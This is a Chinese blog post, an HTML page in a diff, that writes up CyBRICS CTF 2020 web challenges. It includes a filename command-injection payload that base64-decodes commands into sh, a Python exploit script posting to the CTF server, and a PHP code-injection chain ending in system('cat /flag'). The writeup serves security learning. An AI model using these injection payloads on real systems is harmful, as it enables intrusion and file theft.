@@ -1,0 +1,780 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css">
+<script src="//cdn.bootcss.com/highlight.js/9.2.0/highlight.min.js"></script>
+</head>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.js"></script>
+<script type="text/javascript" src="http://libs.baidu.com/jquery/1.8.3/jquery.min.js"></script>
+<!-- 雪花特效 -->
+<script type="text/javascript" src="\js\snow.js"></script>
+<!--动态线条背景-->
+<script>window.onload = function () {
+            hljs.initHighlighting();
+        }</script>
+
+
+  <body>
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="董沅鑫, yuanxin.me@gmail.com" />
+  
+  
+  
+  <title>CyBRICS CTF 2020 Writeup | iluem&#39;Blog</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="Web,CTF," />
+  
+
+  <script>
+    console.log('\n%c Hexo-theme-bmw v4.0 ' + '%c 🎉 https://github.com/dongyuanxin/theme-bmw 🎉\n' + '\n%c View demo online ' + '%c 🔍 https://godbmw.com/ 🔍  \n' , 'color: #fadfa3; background: #030307; padding:3px 0;', '', 'color: #fadfa3; background: #030307; padding:3px 0;', '');
+  </script>
+
+  
+
+  
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/icon/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+
+
+  
+<script src="/js/util.js"></script>
+<script src="/js/valine.min.js"></script>
+
+
+  
+
+  
+    <link href="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.css" rel="stylesheet">
+    <script src="https://cdn.bootcss.com/aplayer/1.10.1/APlayer.min.js" async></script>
+  
+
+  
+  
+  <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" async></script>
+  
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.0/dist/av-min.js"></script>
+  
+
+<meta name="generator" content="Hexo 4.2.1"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+    
+
+    <div id="app">
+
+      <div class="header-wrap">
+  <header>
+    <div class="site-brand">
+      <div class="site-title">
+        <a href="/">iluem.xyz</a>
+      </div>
+    </div>
+    <nav class="site-navigation">
+      <ul class="nav-menu">
+      
+        <li class="nav-item" data-path="/">
+          
+            <a 
+              href="/"
+              target="_self"
+            >
+              主页
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          
+            <a 
+              href="/archives/"
+              target="_self"
+            >
+              归档
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          
+            <a 
+              href="/categories/"
+              target="_self"
+            >
+              分类
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          
+            <a 
+              href="/tags/"
+              target="_self"
+            >
+              标签
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          
+            <a 
+              href="/friends/"
+              target="_self"
+            >
+              友链
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          
+            <a 
+              href="/about/"
+              target="_self"
+            >
+              关于
+            </a>
+          
+        </li>
+      
+        <li class="nav-item" data-path="">
+          
+            <a href="javascript:void(0);" v-else>链接</a>
+            <ul class="nav-menu--dropdown">
+              
+                <li>
+                  <a 
+                    href="https://github.com/qhaoduoyu" 
+                    target="_blank"
+                  >
+                    Github
+                  </a>
+                </li>
+              
+            </ul>
+          
+        </li>
+      
+      </ul>
+    </nav>
+    <i class="iconfont icon-menu"></i>
+  </header>
+</div>
+
+<script>
+  let links = document.querySelectorAll('.nav-item');
+  for(let link of links){
+    let childrenLink = link.querySelector('ul');
+    link.addEventListener('mouseenter', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown active";
+      }
+    })
+    link.addEventListener('mouseleave', () => {
+      if(childrenLink) {
+        childrenLink.className = "nav-menu--dropdown";
+      }
+    })
+  }
+  let rootRealPath = getRealPath(window.location.pathname, true);
+  for(let link of links) {
+    let linkPath = link.getAttribute("data-path");
+    if(linkPath && getRealPath(linkPath, true) === rootRealPath) {
+      link.className = "nav-item hover";
+    }
+  }
+
+  let iconMenu = document.querySelector("i.iconfont.icon-menu"),
+    iconMenuClicked = false;
+  let navDOM = document.querySelector("nav.site-navigation");
+  iconMenu.addEventListener("click", () => {
+    iconMenuClicked 
+      ? navDOM.className = "site-navigation active"
+      : navDOM.className = "site-navigation";
+    iconMenuClicked = !iconMenuClicked;
+  })
+</script>
+
+      
+
+
+
+
+
+
+
+
+<div class="container post-index">
+
+  
+
+<div class="post">
+  <h1 class="article-title">
+    <span>CyBRICS CTF 2020 Writeup</span>
+  </h1>
+  <div class="article-top-meta">
+    <span>
+      发布 : 
+      2020-07-28
+    </span>
+    
+      <span>
+        分类 : 
+          <a href="/categories/Web/">
+            Web
+          </a>
+      </span>
+    
+    
+      <span>
+        浏览 : <span class="article-timer" data-identity="passagesCTF"></span>
+      </span>
+    
+  </div>
+
+  
+
+  <div class="article-content">
+    <div class="markdown-body">
+      <h2 id="Hunt"><a href="#Hunt" class="headerlink" title="Hunt"></a>Hunt</h2><p>一道简单的js，大致思路是通过控制台修改js里的函数然后删除已有的标签，重新运行初始化函数即可。</p>
+<h2 id="Gif2Png"><a href="#Gif2Png" class="headerlink" title="Gif2Png"></a>Gif2Png</h2><p>题目给了源码，flag在main.py文件中，利用的点很明显就是如下所示代码，其中文件名是可控的，所以直接命令注入即可。</p>
+<pre><code class="python">command = subprocess.Popen(f&quot;ffmpeg -i &#39;uploads/{file.filename}&#39; \&quot;uploads/{uid}/%03d.png\&quot;&quot;, shell=True)</code></pre>
+<p>但是没有回显而且不出网，因此只能将文件复制到可以访问的地方，其中给了一个路由</p>
+<pre><code class="python">@app.route(&#39;/uploads/&lt;uid&gt;/&lt;image&gt;&#39;)
+def image(uid, image):
+    logging.debug(request.headers)
+    dir = str(Path(app.config[&#39;UPLOAD_FOLDER&#39;]) / uid)
+    return send_from_directory(dir, image)</code></pre>
+<p>所以可以把文件拷贝到uploads/uid下来即可，uid会在上传时候给你返回的。也可在uploads下生成路径+文件名。</p>
+<p>但要注意其中过滤了的内容过滤了的字符。</p>
+<pre><code class="python"> if not bool(re.match(&quot;^[a-zA-Z0-9_\-. &#39;\&quot;\=\$\(\)\|]*$&quot;, file.filename)) or &quot;..&quot; in file.filename:
+            logging.debug(f&#39;Invalid symbols in filename: {file.content_type}&#39;)
+            flash(&#39;Invalid filename&#39;, &#39;danger&#39;)
+            return redirect(request.url)</code></pre>
+<p>其中给了|和=，因此命令可以用base64编码绕过。</p>
+<pre><code class="python">filename=&quot;&#39;||echo &#39;dGFyIC1jdmYgIHVwbG9hZHMvNWFkZmZkYmEtZjdiZS00YTAwLWI2NTItZDMzNjVhODJlYjc4LzMudGFyICo=&#39;|base64 -d|sh||&#39;2.gif&quot;</code></pre>
+<pre><code>ffmpeg -i &#39;uploads/{file.filename}&#39; \&quot;uploads/{uid}/%03d.png\
+
+&#39;||echo &#39;tar -cvf  uploads/5adffdba-f7be-4a00-b652-d3365a82eb78/3.tar *&#39;|base64 -d|sh||&#39;2.gif</code></pre><p>当然可以用的命令还有 <code>cp main.py uploads/iluem/main.py</code>。</p>
+<p>参考python 脚本如下</p>
+<pre><code class="python">import requests, base64
+
+# Shellcode to execute 
+shellcode = &quot;mkdir uploads/iluem &amp;&amp;tar -cvf uploads/iluem/main.py main.py&quot;
+#tar -cvf  uploads/5adffdba-f7be-4a00-b652-d3365a82eb78/3.tar *
+# b64 encoded shellcode
+encoded = base64.b64encode(shellcode.encode(&quot;utf-8&quot;)).decode(&quot;utf-8&quot;)
+
+print(encoded)
+# Exploit string
+exp = f&quot;\&#39;||echo \&#39;{encoded}\&#39;|base64 -d|sh||\&#39;1.gif&quot;
+
+# Upload file
+files = {&#39;file&#39;:(exp, open(&#39;2.gif&#39;, &#39;rb&#39;), &#39;image/gif&#39;)}
+r = requests.post(&quot;http://gif2png-cybrics2020.ctf.su/&quot;, files=files)</code></pre>
+<h2 id="wc"><a href="#wc" class="headerlink" title="wc"></a>wc</h2><p>这题代码有点多，但是可以利用的点似乎只有在calc里。</p>
+<pre><code class="php">//calc.php
+&lt;?php
+if (!@$_SESSION[&#39;userid&#39;]) {
+    redir(&quot;.&quot;);
+} elseif (!@$_GET[&#39;template&#39;]) {
+    redir(&quot;.&quot;);
+}
+
+$userid = $_SESSION[&#39;userid&#39;];
+$template = $_GET[&#39;template&#39;];
+
+if (!preg_match(&#39;#^[a-f0-9]{8}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{4}-[a-f0-9]{12}$#s&#39;, $template)) {
+    redir(&quot;.&quot;);
+}
+if (!is_file(&quot;calcs/$userid/templates/$template.html&quot;)) {
+    redir(&quot;.&quot;);
+}
+//;eval(system(cp /flag /var/www/iluem.txt));
+//;eval(system(&quot;cp /flag /var/www/321.txt&quot;)) ?&gt;
+    //tar -cvf  /var/www/html/222.html /flag
+if (trim(@$_POST[&#39;field&#39;])) {
+    $field = trim($_POST[&#39;field&#39;]);
+
+    if (!preg_match(&#39;#(?=^([ %()*+\-./]+|\d+|M_PI|M_E|log|rand|sqrt|a?(sin|cos|tan)h?)+$)^([^()]*|([^()]*\((?&gt;[^()]+|(?4))*\)[^()]*)*)$#s&#39;, $field)) {
+        $value = &quot;BAD&quot;;
+    } else {
+        if (@$_POST[&#39;share&#39;]) {
+            $calc = uuid();
+            file_put_contents(&quot;calcs/$userid/$calc.php&quot;, &quot;&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))?&gt;;&lt;/script&gt;\n&quot; . file_get_contents(&quot;inc/calclib.html&quot;) . file_get_contents(&quot;calcs/$userid/templates/$template.html&quot;));
+            redir(&quot;?p=sharelink&amp;calc=$calc&quot;);
+        } else {
+            try {
+                $value = eval(&quot;return $field;&quot;);
+            } catch (Throwable $e) {
+                $value = null;
+            }
+
+            if (!is_numeric($value) &amp;&amp; !is_string($value)) {
+                $value = &quot;ERROR&quot;;
+            } else {
+                $value = (string)$value;
+            }
+        }
+    }
+
+    echo &quot;&lt;script&gt;var preloadValue = &quot; . json_encode($value) . &quot;;&lt;/script&gt;&quot;;
+}
+
+require &quot;inc/calclib.html&quot;;
+require &quot;calcs/$userid/templates/$template.html&quot;;</code></pre>
+<p>但是比赛时思路太死了,一直在想怎么执行eval。却忽视了share里的内容，说到底还是读代码能力不足。</p>
+<p>正则里的限制太多，导致了可用的字符太少。赛后看到<a href="https://www.gem-love.com/ctf/2526.html" target="_blank" rel="noopener">奇奇师傅</a>的题解才顿悟。涨知识了。首先题目给了一个注册功能。用来获得session，同时允许我们上传计算模板的html。可以根据calc里的参数找到newtemplate.php里的内容。上里边限制了上传的内容不能有<code>&lt;?</code>而且必须包含计算器功能的id标签。</p>
+<pre><code class="php">//newtemplate.php
+&lt;?php
+    ···
+if (trim(@$_POST[&#39;html&#39;])) {
+    do {
+        $html = trim($_POST[&#39;html&#39;]);
+        if (strpos($html, &#39;&lt;?&#39;) !== false) {
+            $error = &quot;Bad chars&quot;;
+            break;
+        }
+
+        $requiredBlocks = [
+            &#39;id=&quot;back&quot;&#39;,
+            &#39;id=&quot;field&quot; name=&quot;field&quot;&#39;,
+            &#39;id=&quot;digit0&quot;&#39;,
+            &#39;id=&quot;digit1&quot;&#39;,
+            &#39;id=&quot;digit2&quot;&#39;,
+            &#39;id=&quot;digit3&quot;&#39;,
+            &#39;id=&quot;digit4&quot;&#39;,
+            &#39;id=&quot;digit5&quot;&#39;,
+            &#39;id=&quot;digit6&quot;&#39;,
+            &#39;id=&quot;digit7&quot;&#39;,
+            &#39;id=&quot;digit8&quot;&#39;,
+            &#39;id=&quot;digit9&quot;&#39;,
+            &#39;id=&quot;plus&quot;&#39;,
+            &#39;id=&quot;equals&quot;&#39;,
+        ];
+
+        foreach ($requiredBlocks as $block) {
+            if (strpos($html, $block) === false) {
+                $error = &quot;Missing required block: &#39;$block&#39;&quot;;
+                break(2);
+            }
+        }
+    ···</code></pre>
+<p>这中间有个点就是calc里<code>require</code>了<code>calclib.html</code>和<code>template.html</code>但是只有传递了时才会用到。</p>
+<pre><code class="php">if (@$_POST[&#39;share&#39;]) {
+            $calc = uuid();
+            file_put_contents(&quot;calcs/$userid/$calc.php&quot;, &quot;&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))?&gt;;&lt;/script&gt;\n&quot; . file_get_contents(&quot;inc/calclib.html&quot;) . file_get_contents(&quot;calcs/$userid/templates/$template.html&quot;));
+            redir(&quot;?p=sharelink&amp;calc=$calc&quot;);</code></pre>
+<p>可控变量<code>$filed</code>与后边两个html进行拼接，引用<code>&lt;?=总是可用的(即作为echo 调用)</code>。因此可以利用前边的&lt;? 后边构造 命令执行的语句即可。通过使用注释符将两者中间的html文件注释掉，并在template中写入恶意代码就能完成。</p>
+<pre><code class="php">&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))</code></pre>
+<p>上传html代码并在结尾加上<code>;eval(system(&#39;cat flag&#39;))?&gt;</code>并且构造<code>$field=/*((*/1))/*</code>然后文件就会变成<code>()匹配正则</code></p>
+<pre><code class="php">var preloadValue = &lt;?=json_encode((string)(1))/*···*/;eval(system(&#39;cat /flag&#39;))?&gt;</code></pre>
+<p>这样，利用多行注释闭合了<code>json_encode()</code>的同时也让php命令从中逃逸出来成功执行，得到flag</p>
+<pre><code>&lt;script&gt;var preloadValue = &quot;1&quot;cybrics{5aMe_7h1ng_W3_d0_3Ve5y_n16ht_P1nKY.Try_2_t4k3_0vEr_t3h_w0RLd}</code></pre>
+    </div>
+  </div>
+  
+  
+  
+
+  
+
+  <div class="article-footer">
+    <div class="article-meta pull-left">
+      <span>
+        
+          <i class="iconfont icon-06tags"></i>标签: 
+          
+          <span class="span--tag">
+            <a href="/tags/CTF/">
+              #CTF
+            </a>
+          </span>
+          
+        
+      </span>
+    </div>
+    <div class="article-meta pull-right">
+    </div>
+  </div>
+</div>
+
+
+  <aside id="sidebar">
+    <p id="sidebar-header"></p>
+    <ol id="sidebar-toc"></ol>
+  </aside>
+  <script async>setTimeout(generateToc, 10);</script>
+
+
+  <nav class="post-navigation">
+    
+      <div class="nav-pre">
+        <i class="iconfont icon-prev"></i>
+        上一篇:
+        <a href="/passages%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" target="_self">命令执行</a>
+      </div>
+    
+    
+      <div class="nav-next">
+        下一篇:
+        <a href="/passagessqli-labs/" target="_self">sqli-labs</a>
+        <i class="iconfont icon-next"></i>
+      </div>
+    
+  </nav>
+
+  
+    <a href="#comment" class="comment-anchor"></a>
+<div class="comment-title"><i class="iconfont icon-footprint"></i> 留下足迹 <i class="iconfont icon-footprint"></i></div>
+<div id="vcomments"></div>
+
+<script defer>
+  if( true ) {
+    let path = getRealPath()
+    new Valine({
+      el: "#vcomments",
+      appId: "0uSharGIGNO1brdWwOsU0Tf7-gzGzoHsz",
+      appKey: "sivgWCRfGcA6BX905S8dIz1E",
+      notify: false,
+      verify: false,
+      avatar: "robohash",
+      placeholder: "正确填写邮箱, 才能及时收到回复哦♪(^∇^*)",
+      path
+    });
+  }
+</script>
+   
+
+  
+    <script defer>
+const valineAPI = (() => {
+  try {
+    AV.init("0uSharGIGNO1brdWwOsU0Tf7-gzGzoHsz", "sivgWCRfGcA6BX905S8dIz1E");
+  } catch(error) {}
+  const isExist = (identity) => {
+    identity = identity || getRealPath();
+    let query = new AV.Query('Timer');
+    return new Promise((resolve, reject) => {
+      query.equalTo("identity", identity);
+      query.find().then(results => {
+        resolve(results.length > 0);
+      }, error => reject(error));
+    })
+  }
+
+  const _get = (identity) => {
+    let query = null;
+    if(identity && identity instanceof Array){
+      let querys = [];
+      for(let i = 0; i < identity.length; ++i) {
+        querys[i] = new AV.Query('Timer');
+        querys[i].equalTo('identity', identity[i]);
+      }
+      query = AV.Query.or.apply(null ,querys);
+    } else {
+      identity = identity || getRealPath();
+      query = new AV.Query("Timer");
+      query.equalTo("identity", identity);
+    }
+
+    return new Promise((resolve, reject) => {
+      query.find()
+      .then(results => resolve(results))
+      .catch(error => reject(error))
+    })
+  }
+
+  const create = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let Todo = AV.Object.extend('Timer');
+      let todo = new Todo();
+      todo.set("times", 1);
+      todo.set("identity", identity);
+      todo.save().then(res => resolve(true), error => reject(error));
+    })
+  }
+
+  const update = (identity) => {
+    identity = identity || getRealPath();
+    return new Promise((resolve, reject) => {
+      let query = new AV.Query('Timer');
+      query.equalTo("identity", identity);
+      query.find().then(todos => {
+        todos.forEach(todo => {
+          todo.set("times", todo.attributes.times + 1);
+        });
+        return AV.Object.saveAll(todos);
+      }).then(todos => resolve(true), error => reject(error));
+    })
+  }
+
+  return {
+    isExist,
+    _get,
+    update,
+    create
+  }
+})()
+
+const calcAndWriteTimes = () => {
+  let isPost = true;
+
+  let timerAllDOM = document.querySelectorAll(".article-timer");
+
+  if(isPost) {
+    let identity = timerAllDOM[0].getAttribute("data-identity");
+    valineAPI.isExist(identity)
+    .then(exist => {
+      if(exist) {
+        return valineAPI.update(identity);
+      }
+      return new Promise(resolve => resolve(true));
+    })
+    .then( succuess => valineAPI._get(identity))
+    .then( result => timerAllDOM[0].innerText = result[0].attributes.times)
+    .catch(error => console.log(error.message))
+    return ;
+  }
+
+  let timerDOMCache = {};
+
+  for(let timerDOM of timerAllDOM) {
+    let identity = timerDOM.getAttribute("data-identity");
+    if(timerDOMCache.hasOwnProperty(identity)){
+      timerDOMCache[identity].dom.push(timerDOM);
+    }else{
+      timerDOMCache[identity] = {
+        dom: [timerDOM],
+        times: undefined
+      };
+    }
+  }
+
+  let identities = Object.keys(timerDOMCache);
+  valineAPI._get(identities).then(results => {
+    for(let result of results) {
+      let {identity, times} = result.attributes;
+      timerDOMCache[identity].times = times;
+      timerDOMCache[identity].dom.map(item => item.innerText = times);
+    }
+    for(let identity of identities) {
+      if(timerDOMCache[identity].times){
+        continue;
+      }
+      timerDOMCache[identity].dom.map(item => item.innerText = 1);
+      valineAPI.create(identity);
+    }
+  }).catch(error => console.log(error.message))
+}
+
+if(true){
+  calcAndWriteTimes();
+}
+</script>
+   
+
+</div>
+
+
+      <footer>
+  <p class="site-info">
+    博客已萌萌哒运行<span id="time-to-now"></span><span class="my-face">(●'◡'●)ﾉ♥</span>
+    <br>
+    Theme - <a href="https://github.com/dongyuanxin/theme-bmw" target="_blank" rel="noopener">BMW</a> | Made With 💗 | Powered by <a href="https://godbmw.com/" target="_blank" rel="noopener">GodBMW</a>
+    <br>
+    
+  </p>
+</footer>
+
+
+
+<script>
+const timeToNowDOM = document.querySelector("#time-to-now");
+const startTimestamp = new Date(2020, 5, 8).getTime();
+
+const updateTimeStr = () => {
+  let offset = parseInt(
+      (new Date().getTime() - startTimestamp) / 1000,
+      10
+    ),
+    day = Math.floor(offset / 86400),
+    hour = Math.floor((offset % 86400) / 3600),
+    minute = Math.floor(((offset % 86400) % 3600) / 60),
+    second = Math.floor(((offset % 86400) % 3600) % 60);
+  timeToNowDOM.innerHTML =
+    day + "天" + hour + "小时" + minute + "分钟" + second + "秒";
+  setTimeout(updateTimeStr, 500);
+}
+
+setTimeout(updateTimeStr, 500);
+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+
+
+
+  </body>
+  
+  
+  <!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
+
+
+
+</html>
